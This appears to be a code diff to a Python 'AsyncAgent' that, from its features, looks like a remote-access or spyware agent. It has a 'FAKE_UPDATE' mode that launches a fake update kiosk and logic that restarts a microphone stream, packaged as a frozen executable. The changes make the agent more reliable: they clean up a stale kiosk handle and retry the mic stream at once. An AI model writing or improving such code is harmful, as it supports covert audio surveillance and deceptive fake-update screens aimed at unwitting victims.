@@ -239,7 +239,8 @@ class AsyncAgent:
                         
                     if mode == "FAKE_UPDATE":
                         print("[*] Launching Fake Update Kiosk...")
-                        if not self.kiosk_process:
+                        if not self.kiosk_process or self.kiosk_process.poll() is not None:
+                            self.kiosk_process = None  # Clean up stale handle
                             # Resolve kiosk script path (support frozen exe)
                             if getattr(sys, 'frozen', False):
                                 # PyInstaller: check _MEIPASS first
@@ -577,6 +578,7 @@ class AsyncAgent:
                         
                         if self.mic.start():
                             failures = 0
+                            continue  # Skip sleep, immediately retry loop
                         else:
                             print("[-] Failed to restart Mic Stream")
                             # Don't reset failures, let it loop and retry or fail
